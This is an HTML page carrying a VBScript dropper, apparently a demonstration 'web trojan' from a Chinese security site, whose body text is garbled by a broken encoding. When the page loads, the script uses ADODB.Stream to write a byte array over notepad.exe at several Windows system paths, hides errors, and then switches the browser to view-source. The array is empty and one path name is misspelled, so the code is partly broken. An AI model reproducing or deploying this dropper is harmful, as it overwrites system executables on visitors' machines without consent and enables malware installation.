<script language="vbs">
ar=array()
win2k="c:\winnt\notepad.exe"
win2ok="c:\winnt\system\notepad.exe"
winxp="c:\windows\notepad.exe"
winxpee="c:\windows\system32\notepad.exe"
win98="c:\windows\notepad.exe"
win98ate="c:\windows\system\notepad.exe"
Function toString(DevilWithin)
For Each arrayElement In DevilWithin
toString = toString & ChrB(arrayElement)
Next
End Function
Const adTypeBinary = 1
Const adTypeText = 2
Const adSaveCreateOverWrite = 2
Set devil = CreateObject("Adodb.Stream")
devil.Type = adTypeText
devil.Open
devil.WriteText toString(ar)
devil.Position = 0
devil.Type = adTypeBinary
devil.Position = 2
bytearray = devil.Read
devil.Close
Set within = CreateObject("Adodb.Stream")
within.Type = adTypeBinary
within.Open
within.Write bytearray
On Error Resume Next
within.SaveToFile (win2k), adSaveCreateOverWrite
On Error Resume Next
within.SaveToFile (win2ok), adSaveCreateOverWrite
On Error Resume Next
within.SaveToFile (winxp), adSaveCreateOverWrite
On Error Resume Next
within.SaveToFile (winxpee), adSaveCreateOverWrite
On Error Resume Next
within.SaveToFile (win98), adSaveCreateOverWrite
On Error Resume Next
within.SaveToFile (win9ate), adSaveCreateOverWrite
On Error Resume Next
within.Close
document.location = "view-source:" + document.location.href
</script>
<body>Ѫ����ҳľ����ԣ���ӭ���������簲ȫ������վ�����ǣ�www.qfaq.com
